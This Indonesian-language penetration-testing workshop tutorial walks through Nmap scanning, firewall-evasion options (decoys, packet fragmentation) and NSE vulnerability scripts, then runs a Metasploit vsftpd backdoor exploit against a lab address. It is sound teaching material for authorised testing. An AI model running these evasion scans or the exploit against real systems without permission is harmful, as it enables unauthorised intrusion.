# Pengunaan Nmap untuk Penetration Testing

## Langkah 2: Port Scanning

### 2.1. Pemindaian Port Dasar
Pemindaian port dasar akan memindai 1000 port TCP paling umum:
```bash
nmap 10.0.2.7
```
**Hasil**: Nmap akan mengembalikan daftar port yang terbuka, tertutup, atau difilter.

### 2.2. Pemindaian Port Spesifik
Jika Anda ingin memindai port tertentu, gunakan opsi `-p`:
```bash
nmap -p 22,80,443 10.0.2.7
```
**Hasil**: Nmap akan memindai port 22 (SSH), 80 (HTTP), dan 443 (HTTPS).

### 2.3. Pemindaian UDP
Untuk memindai port UDP, gunakan opsi `-sU`:
```bash
sudo nmap -sU 10.0.2.7
```
**Hasil**: Nmap akan mengembalikan daftar port UDP yang terbuka.

## Langkah 3: Service dan Version Detection

### 3.1. Deteksi Versi Layanan
Untuk mengetahui versi layanan yang berjalan di port terbuka, gunakan opsi `-sV`:
```bash
nmap -sV 10.0.2.7
```
**Hasil**: Nmap akan mengembalikan informasi tentang layanan dan versinya.

### 3.2. Deteksi Sistem Operasi
Untuk mendeteksi sistem operasi yang berjalan pada host, gunakan opsi `-O`:
```bash
sudo nmap -O 10.0.2.7
```
**Hasil**: Nmap akan mengembalikan informasi tentang sistem operasi.

## Langkah 4: Teknik Pemindaian Lanjutan

### 4.1. Pemindaian dengan Kecepatan Tertentu
Anda dapat mengontrol kecepatan pemindaian dengan opsi `-T`:
```bash
nmap -T5 10.0.2.7
```
- `-T5`: Kecepatan maksimum (insane).
- `-T0`: Kecepatan minimum (paranoid).

**Catatan**: Semakin cepat pemindaian, semakin besar kemungkinan terdeteksi oleh sistem keamanan.

### 4.2. Pemindaian dengan Decoy
Untuk menyembunyikan alamat IP Anda, gunakan opsi `-D`:
```bash
sudo nmap -D RND:20 10.0.2.7
```
- `-D RND:20`: Menambahkan 20 alamat IP acak sebagai decoy.

**Hasil**: Pemindaian akan terlihat seperti berasal dari banyak alamat IP.

### 4.3. Pemindaian dengan Fragmentasi Paket
Untuk menghindari deteksi firewall, gunakan opsi `-f`:
```bash
sudo nmap -f 10.0.2.7
```
**Hasil**: Paket akan dipecah menjadi fragmen yang lebih kecil.

## Langkah 5: Vulnerability Scanning dengan Nmap Scripting Engine (NSE)

### 5.1. Pemindaian Kerentanan SMB
Untuk memindai kerentanan SMB, gunakan script `smb-vuln`:
```bash
nmap --script smb-vuln* 10.0.2.7
```
**Hasil**: Nmap akan mengembalikan daftar kerentanan SMB yang ditemukan.

### 5.2. Pemindaian Kerentanan FTP
Untuk memindai kerentanan FTP, gunakan script `ftp-vuln`:
```bash
nmap --script ftp-vuln* 10.0.2.13
```
**Hasil**: Nmap akan mengembalikan daftar kerentanan FTP yang ditemukan.

### 5.3. Pemindaian Kerentanan Umum
Untuk memindai semua kerentanan yang diketahui, gunakan script `vuln`:
```bash
nmap --script vuln 10.0.2.7
```
**Hasil**: Nmap akan mengembalikan daftar kerentanan yang ditemukan.

## Langkah 6: Eksploitasi Kerentanan dengan Metasploit

Setelah menemukan kerentanan, Anda dapat menggunakan Metasploit untuk mencoba mengeksploitasi kerentanan tersebut. Misalnya, untuk mengeksploitasi kerentanan pada vsftpd:
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.13
run
```
**Hasil**: Jika berhasil, Anda akan mendapatkan akses ke sistem target.

## Kesimpulan

Nmap adalah alat yang sangat powerful untuk penetration testing. Dalam workshop ini, kita telah mempelajari cara menggunakan Nmap untuk:
- **Host Discovery**
- **Port Scanning**
- **Service dan Version Detection**
- **Vulnerability Scanning**
- **Eksploitasi Kerentanan**

Selalu ingat untuk menggunakan alat ini dengan bertanggung jawab dan hanya pada sistem yang Anda memiliki izin untuk mengujinya.

---

**Referensi**:
- [Nmap Documentation](https://nmap.org/book/man.html)
- [Metasploit Framework](https://www.metasploit.com/)
